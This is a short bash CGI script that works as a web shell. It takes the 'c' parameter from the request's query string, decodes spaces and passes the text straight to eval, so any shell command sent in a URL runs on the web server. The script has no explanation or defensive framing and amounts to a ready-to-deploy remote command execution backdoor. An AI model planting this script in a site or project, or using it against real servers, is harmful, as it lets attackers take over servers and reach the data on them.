#!/bin/bash
echo -ne "Content-Type: text/html\n\n"
b=$(echo "$QUERY_STRING" | sed -n 's/^.*c=\([^&]*\).*$/\1/p' | sed "s/%20/ /g")
eval $b